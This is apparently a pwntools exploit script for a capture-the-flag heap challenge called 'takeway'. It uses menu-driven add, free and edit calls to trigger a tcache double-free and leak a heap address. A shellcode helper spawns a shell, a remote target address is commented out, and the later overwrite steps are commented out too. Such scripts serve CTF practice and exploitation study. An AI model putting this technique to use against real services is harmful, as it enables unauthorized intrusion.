from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')

sl=lambda x:io.sendline(x)
sd=lambda x:io.send(x)
sa=lambda x,y:io.sendafter(x,y)
sla=lambda x,y:io.sendlineafter(x,y)
rc=lambda x:io.recv(x)
rl=lambda :io.recvline()
ru=lambda x:io.recvuntil(x)
ita=lambda :io.interactive()
slc=lambda :asm(shellcraft.sh())
uu64=lambda x:u64(x.ljust(8,b'\0'))
uu32=lambda x:u32(x.ljust(4,b'\0'))
def gdba(x=''):
	if type(io)==pwnlib.tubes.remote.remote:
		return
	elif type(io)==pwnlib.tubes.process.process:
		gdb.attach(io,x)
		pause()

io = process('./takeway')
elf = ELF('./takeway')
# io = remote('101.200.234.115',48893)

# tcache double free

def add(index,content,remark):
	sla('Please input your choose: ','1')
	sla('Please input your order index\n',str(index))
	sla('name: ',content)
	sla('remark: ',remark)

def free(index):
	sla('Please input your choose: ','2')
	sla('index: ',str(index))

def edit(index,content):
	sla('Please input your choose: ','3')
	sla('index: ',str(index))
	ru('The remark of this order is: ')
	res = rl()[:-1]
	res = uu32(res)
	sla('is: ',content)
	return res


# 最多add 5个

# for i in range(3):
# 	add(i,'a','a')
add(0,'a','a')
add(1,'a','a')
add(2,'a','a')
add(3,'a','a')
add(4,'a','a')





free(0)
# gdba()
heap = edit(0,b'aaaaaaaa')
heap = heap + 0x13b0	 # topchunk address
log.success('heap:'+hex(heap))
# edit(1,p64(heap-0x50-8)) # chunk 2
# edit(526,p64(0x101)) # chunk 1所在位置

# free(3)

# edit(4,p64(heap))
# edit(544,b'xiong')# 544*8+0x4040a0 (544为chunk4所在的位置)

ita()